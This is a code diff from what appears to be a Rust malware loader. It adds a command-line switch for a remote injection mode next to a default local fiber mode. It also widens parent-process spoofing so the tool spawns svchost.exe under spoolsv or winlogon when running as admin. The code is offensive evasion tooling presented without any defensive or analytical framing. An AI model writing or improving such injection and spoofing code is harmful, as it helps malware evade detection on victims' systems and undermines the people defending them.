@@ -72,8 +72,8 @@ fn main() -> Result<()> {
     unsafe {
         initialize_hooks();
         
-        let mode = if args.len() > 1 {
-            args[1].as_str()
+        let mode = if args.iter().any(|arg| arg == "/r") {
+            "/r"
         } else {
             "/l" // default to local fiber
         };
@@ -272,7 +272,16 @@ fn main() -> Result<()> {
 
                 if _is_admin && use_spoofing {
                     // find spoof parent
-                    if let Some(parent_pid) = find_remote::find_target_pid("spoolsv") {
+                    let candidates = ["spoolsv", "winlogon"];
+                    let mut parent_pid_opt = None;
+                    for name in candidates.iter() {
+                        if let Some(pid) = find_remote::find_target_pid(name) {
+                            parent_pid_opt = Some(pid);
+                            break;
+                        }
+                    }
+
+                    if let Some(parent_pid) = parent_pid_opt {
                         // spawn child with parent
                          match spoof_proc::spawn_spoofed_process(parent_pid, "C:\\Windows\\System32\\svchost.exe") {
                             Ok(pi) => {
@@ -309,7 +318,7 @@ fn main() -> Result<()> {
                             }
                         }
                     } else {
-                        // println!("[-] Spoolsv not found!");
+                        // println!("[-] Processes not found!");
                     }
                 }
                 
